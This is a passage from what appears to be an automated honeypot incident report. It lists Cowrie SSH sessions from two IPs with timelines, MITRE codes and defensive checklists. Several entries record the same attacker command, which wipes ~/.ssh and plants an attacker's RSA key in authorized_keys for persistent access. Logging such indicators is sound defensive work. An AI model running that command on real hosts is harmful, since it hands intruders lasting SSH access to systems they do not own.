- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0476e6490fe

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:42` | `cowrie.session.connect` |
| `2026-04-22 17:49:42` | `cowrie.client.version` |
| `2026-04-22 17:49:42` | `cowrie.client.kex` |
| `2026-04-22 17:49:43` | `cowrie.login.success` |
| `2026-04-22 17:49:44` | `cowrie.session.params` |
| `2026-04-22 17:49:44` | `cowrie.command.input` |
| `2026-04-22 17:49:44` | `cowrie.command.failed` |
| `2026-04-22 17:49:44` | `cowrie.log.closed` |
| `2026-04-22 17:49:45` | `cowrie.session.params` |
| `2026-04-22 17:49:45` | `cowrie.command.input` |
| `2026-04-22 17:49:45` | `cowrie.session.file_download` |
| `2026-04-22 17:49:45` | `cowrie.log.closed` |
| `2026-04-22 17:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b28c8be97db5

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:47` | `cowrie.session.connect` |
| `2026-04-22 17:49:47` | `cowrie.client.version` |
| `2026-04-22 17:49:47` | `cowrie.client.kex` |
| `2026-04-22 17:49:48` | `cowrie.login.success` |
| `2026-04-22 17:49:48` | `cowrie.session.params` |
| `2026-04-22 17:49:48` | `cowrie.command.input` |
| `2026-04-22 17:49:48` | `cowrie.command.failed` |
| `2026-04-22 17:49:49` | `cowrie.log.closed` |
| `2026-04-22 17:49:49` | `cowrie.session.params` |
| `2026-04-22 17:49:49` | `cowrie.command.input` |
| `2026-04-22 17:49:49` | `cowrie.session.file_download` |
| `2026-04-22 17:49:49` | `cowrie.log.closed` |
| `2026-04-22 17:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a275a1fbe01

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:48` | `cowrie.session.connect` |
| `2026-04-22 17:49:48` | `cowrie.client.version` |
| `2026-04-22 17:49:48` | `cowrie.client.kex` |
| `2026-04-22 17:49:49` | `cowrie.login.success` |
| `2026-04-22 17:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dbe138e0eac

| Field | Detail |
|---|---|
| **Source IP** | `36.103.243[.]179` |
| **First Seen** | 2026-04-22 17:49 |
| **Last Seen** | 2026-04-22 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:49:51` | `cowrie.session.connect` |
| `2026-04-22 17:49:51` | `cowrie.client.version` |
| `2026-04-22 17:49:52` | `cowrie.client.kex` |
| `2026-04-22 17:49:52` | `cowrie.login.success` |
| `2026-04-22 17:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.103.243[.]179` to AbuseIPDB if not already reported
- [ ] Block `36.103.243[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d0b699e5ab

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:50 |
| **Last Seen** | 2026-04-22 17:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:50:21` | `cowrie.session.connect` |
| `2026-04-22 17:50:21` | `cowrie.client.version` |
| `2026-04-22 17:50:21` | `cowrie.client.kex` |
| `2026-04-22 17:50:22` | `cowrie.login.success` |
| `2026-04-22 17:50:23` | `cowrie.session.params` |
| `2026-04-22 17:50:23` | `cowrie.command.input` |
| `2026-04-22 17:50:23` | `cowrie.command.failed` |
| `2026-04-22 17:50:23` | `cowrie.log.closed` |
| `2026-04-22 17:50:24` | `cowrie.session.params` |
| `2026-04-22 17:50:24` | `cowrie.command.input` |
| `2026-04-22 17:50:24` | `cowrie.session.file_download` |
| `2026-04-22 17:50:24` | `cowrie.log.closed` |
| `2026-04-22 17:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb3beb8c6d8a

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:50 |
| **Last Seen** | 2026-04-22 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:50:27` | `cowrie.session.connect` |
| `2026-04-22 17:50:27` | `cowrie.client.version` |
| `2026-04-22 17:50:27` | `cowrie.client.kex` |
| `2026-04-22 17:50:28` | `cowrie.login.success` |
| `2026-04-22 17:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ae5810f912

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:51 |
| **Last Seen** | 2026-04-22 17:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:51:00` | `cowrie.session.connect` |
| `2026-04-22 17:51:00` | `cowrie.client.version` |
| `2026-04-22 17:51:00` | `cowrie.client.kex` |
| `2026-04-22 17:51:01` | `cowrie.login.success` |
| `2026-04-22 17:51:02` | `cowrie.session.params` |
| `2026-04-22 17:51:02` | `cowrie.command.input` |
| `2026-04-22 17:51:02` | `cowrie.command.failed` |
| `2026-04-22 17:51:02` | `cowrie.log.closed` |
| `2026-04-22 17:51:03` | `cowrie.session.params` |
| `2026-04-22 17:51:03` | `cowrie.command.input` |
| `2026-04-22 17:51:03` | `cowrie.session.file_download` |
| `2026-04-22 17:51:03` | `cowrie.log.closed` |
| `2026-04-22 17:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c962dc9b9245

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:51 |
| **Last Seen** | 2026-04-22 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:51:06` | `cowrie.session.connect` |
| `2026-04-22 17:51:06` | `cowrie.client.version` |
| `2026-04-22 17:51:06` | `cowrie.client.kex` |
| `2026-04-22 17:51:07` | `cowrie.login.success` |
| `2026-04-22 17:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b13be63c298

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:52 |
| **Last Seen** | 2026-04-22 17:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:52:52` | `cowrie.session.connect` |
| `2026-04-22 17:52:52` | `cowrie.client.version` |
| `2026-04-22 17:52:52` | `cowrie.client.kex` |
| `2026-04-22 17:52:53` | `cowrie.login.success` |
| `2026-04-22 17:52:54` | `cowrie.session.params` |
| `2026-04-22 17:52:54` | `cowrie.command.input` |
| `2026-04-22 17:52:54` | `cowrie.command.failed` |
| `2026-04-22 17:52:54` | `cowrie.log.closed` |
| `2026-04-22 17:52:55` | `cowrie.session.params` |
| `2026-04-22 17:52:55` | `cowrie.command.input` |
| `2026-04-22 17:52:55` | `cowrie.session.file_download` |
| `2026-04-22 17:52:55` | `cowrie.log.closed` |
| `2026-04-22 17:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f90e7153e6

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:52 |
| **Last Seen** | 2026-04-22 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:52:58` | `cowrie.session.connect` |
| `2026-04-22 17:52:58` | `cowrie.client.version` |
| `2026-04-22 17:52:58` | `cowrie.client.kex` |
| `2026-04-22 17:52:59` | `cowrie.login.success` |
| `2026-04-22 17:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa34c13b365

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:55 |
| **Last Seen** | 2026-04-22 17:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:55:15` | `cowrie.session.connect` |
| `2026-04-22 17:55:15` | `cowrie.client.version` |
| `2026-04-22 17:55:15` | `cowrie.client.kex` |
| `2026-04-22 17:55:16` | `cowrie.login.success` |
| `2026-04-22 17:55:17` | `cowrie.session.params` |
| `2026-04-22 17:55:17` | `cowrie.command.input` |
| `2026-04-22 17:55:17` | `cowrie.command.failed` |
| `2026-04-22 17:55:17` | `cowrie.log.closed` |
| `2026-04-22 17:55:18` | `cowrie.session.params` |
| `2026-04-22 17:55:18` | `cowrie.command.input` |
| `2026-04-22 17:55:18` | `cowrie.session.file_download` |
| `2026-04-22 17:55:18` | `cowrie.log.closed` |
| `2026-04-22 17:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf6d82cb1832

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:55 |
| **Last Seen** | 2026-04-22 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:55:21` | `cowrie.session.connect` |
| `2026-04-22 17:55:21` | `cowrie.client.version` |
| `2026-04-22 17:55:21` | `cowrie.client.kex` |
| `2026-04-22 17:55:22` | `cowrie.login.success` |
| `2026-04-22 17:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d14a40ce777b

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:55 |
| **Last Seen** | 2026-04-22 17:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:55:52` | `cowrie.session.connect` |
| `2026-04-22 17:55:52` | `cowrie.client.version` |
| `2026-04-22 17:55:52` | `cowrie.client.kex` |
| `2026-04-22 17:55:53` | `cowrie.login.success` |
| `2026-04-22 17:55:54` | `cowrie.session.params` |
| `2026-04-22 17:55:54` | `cowrie.command.input` |
| `2026-04-22 17:55:54` | `cowrie.command.failed` |
| `2026-04-22 17:55:54` | `cowrie.log.closed` |
| `2026-04-22 17:55:55` | `cowrie.session.params` |
| `2026-04-22 17:55:55` | `cowrie.command.input` |
| `2026-04-22 17:55:55` | `cowrie.session.file_download` |
| `2026-04-22 17:55:55` | `cowrie.log.closed` |
| `2026-04-22 17:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48711ee6e7a7

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:55 |
| **Last Seen** | 2026-04-22 17:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:55:58` | `cowrie.session.connect` |
| `2026-04-22 17:55:58` | `cowrie.client.version` |
| `2026-04-22 17:55:58` | `cowrie.client.kex` |
| `2026-04-22 17:55:59` | `cowrie.login.success` |
| `2026-04-22 17:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ffe296d1abb

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:57 |
| **Last Seen** | 2026-04-22 17:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:57:07` | `cowrie.session.connect` |
| `2026-04-22 17:57:07` | `cowrie.client.version` |
| `2026-04-22 17:57:07` | `cowrie.client.kex` |
| `2026-04-22 17:57:08` | `cowrie.login.success` |
| `2026-04-22 17:57:08` | `cowrie.session.params` |
| `2026-04-22 17:57:08` | `cowrie.command.input` |
| `2026-04-22 17:57:08` | `cowrie.command.failed` |
| `2026-04-22 17:57:09` | `cowrie.log.closed` |
| `2026-04-22 17:57:09` | `cowrie.session.params` |
| `2026-04-22 17:57:09` | `cowrie.command.input` |
| `2026-04-22 17:57:10` | `cowrie.session.file_download` |
| `2026-04-22 17:57:10` | `cowrie.log.closed` |
| `2026-04-22 17:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30790ed3fe1b

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:57 |
| **Last Seen** | 2026-04-22 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 17:57:13` | `cowrie.session.connect` |
| `2026-04-22 17:57:13` | `cowrie.client.version` |
| `2026-04-22 17:57:13` | `cowrie.client.kex` |
| `2026-04-22 17:57:14` | `cowrie.login.success` |
| `2026-04-22 17:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a8b9afa75f3

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-22 17:58 |
| **Last Seen** | 2026-04-22 17:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

